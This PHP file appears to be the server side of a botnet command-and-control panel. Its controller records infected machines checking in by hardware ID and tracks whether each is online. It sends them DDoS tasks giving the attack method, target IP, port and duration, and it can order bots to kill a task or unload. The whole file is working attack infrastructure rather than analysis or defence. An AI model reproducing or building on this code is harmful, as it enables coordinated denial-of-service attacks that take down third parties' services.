<?php

class ddosHandlerController{


    public function ddoscontroll(){

        if(!empty($_POST["hwid"])){
            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_avalible WHERE botid = :botid");
            $result = $statement->execute(array('botid' => $_POST["hwid"]));
            $user = $statement->fetch();
            if($user !== false) {
                if($user["active"] == 2 && $user["lastseen"] >= (time() - 5)){
                    echo "unload";
                    die();
                }
                $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_avalible SET lastseen = ?, ddos_taskid = ?, active = ?  WHERE botid = ?");
                $statement->execute(array(time(), $_POST["taskid"],  $_POST["taskrunning"],$_POST["hwid"]));
            }else{
                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_avalible (botid, lastseen, ddos_taskid, active) VALUES (?, ?, ?, ?)");
                $statement->execute(array($_POST["hwid"], time(), $_POST["taskid"], $_POST["taskrunning"]));
            }

            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_tasks WHERE executed_at >= (CURRENT_TIMESTAMP() + maxtime) ");
            $statement->execute(array());
            while($task = $statement->fetch()) {
                if($task["status"] != "active" && $_POST["taskid"] == $task["id"]){
                    //Kill if it is Disabled Ignore if it is not working on the Task
                    echo "kill";
                    die();
                }
                if($task["status"] == "active" && intval($_POST["taskrunning"]) != 1 ){
                    //Task is Active invite bot for Working
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_tasks SET executed_at = ? WHERE id = ?");
                    $statement->execute(array(time(),$task["id"]));
                    echo "newddos;".$task["id"].";".$task["method"].";".$task["targetip"].";".$task["port"].";".$task["maxtime"];
                    die();
                }
            }
        }



        //echo "kill";
        //echo "new;1;http://target.com";
        die();
    }

}